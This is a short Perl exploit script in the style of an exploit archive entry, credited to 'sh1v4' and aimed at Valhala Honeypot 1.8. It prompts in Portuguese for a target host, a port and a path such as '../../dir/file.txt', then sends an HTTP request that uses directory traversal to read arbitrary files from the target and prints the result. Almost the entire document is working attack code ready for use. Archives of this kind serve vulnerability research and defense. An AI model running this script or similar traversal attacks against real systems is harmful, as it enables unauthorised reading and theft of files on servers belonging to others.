# Exploit Title: Valhala Honeypot Expl0it
# Date: 14/07/2012
# Author: sh1v4
# Founded by: pswd
# Vendor or Software Link: http://valhalahoneypot.sourceforge.net/
# Version: Valhala 1.8
# Category:: Remote
# Tested on: Windows XP SP2 & Ubuntu 12.04
# Contacts: x41sh1v4@hotmail.com / @x41sh1v4

use warnings;  
use LWP::UserAgent;   
print "#########################################\n# Valhala Honeypot Expl0it by: x41sh1v4 # \n#########################################\n";  
print "#               x41Security             # \n#########################################\n\n";  
print "-> Alvo (Ex:127.0.0.1): ";
$alv = <STDIN>; 
print "-> Digite a porta do alvo (Ex:80, 8080):";
$port = <STDIN>;
print "-> Digite o diretorio/nome do arquivo que voce deseja pegar (Ex:../../dir/file.txt): ";
$arq = <STDIN>; 

$usera = LWP::UserAgent->new();  
$usera-> agent("injector");   
$usera->timeout( 60 );                   
$exp = $usera->get("http://$alv:$port/$arq");   
$cont = $exp->content;   
if ($cont){  
printf $exp->content;        
}
else{ 
printf "Voc� deve ter feito alguma merda...";                      
}  
